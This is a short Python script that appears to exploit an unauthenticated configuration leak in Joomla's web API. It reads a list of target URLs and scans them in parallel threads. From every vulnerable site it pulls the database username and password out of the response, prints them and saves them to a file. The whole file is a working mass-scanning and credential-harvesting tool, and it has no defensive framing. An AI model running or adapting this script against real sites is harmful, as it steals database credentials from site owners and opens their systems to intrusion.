import sys
import attrs
import requests
import argparse
from concurrent.futures import ThreadPoolExecutor

@attrs.define
class CheckVuln:

    url : str
    path : str = '/api/index.php/v1/config/application?public=true'

    def CheckVuln(self) -> bool:
        req = requests.get(f'{self.url}{self.path}')
        if 'password' in req.text:
            return True
        
    def ParseData(self):
        req = requests.get(f'{self.url}{self.path}')
        data = req.text
        password = data.split('"password":"')[1].split('","')[0]
        user = data.split('"user":"')[1].split('","')[0]
        return password, user


def check_vuln(url):
    if CheckVuln(url).CheckVuln():
        print(f'{url} is vulnerable')
        print(f'password is {CheckVuln(url).ParseData()}')
        with open('vulnerable.txt', 'a') as f:
            f.write(f'{url} is vulnerable')
            f.write(f'password is {CheckVuln(url).ParseData()}')
    else:
        print(f'{url} is not vulnerable')


def main():
    parser = argparse.ArgumentParser(description='Check for vulnerabilities in a list of URLs.')
    parser.add_argument('filename', help='the name of the file containing the list of URLs')
    parser.add_argument('--threads', type=int, default=5, help='the number of threads to use (default: 5)')
    args = parser.parse_args()

    with open(args.filename, 'r') as f:
        urls = [url.strip() for url in f.readlines()]

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        executor.map(check_vuln, urls)


if __name__ == '__main__':
    main()
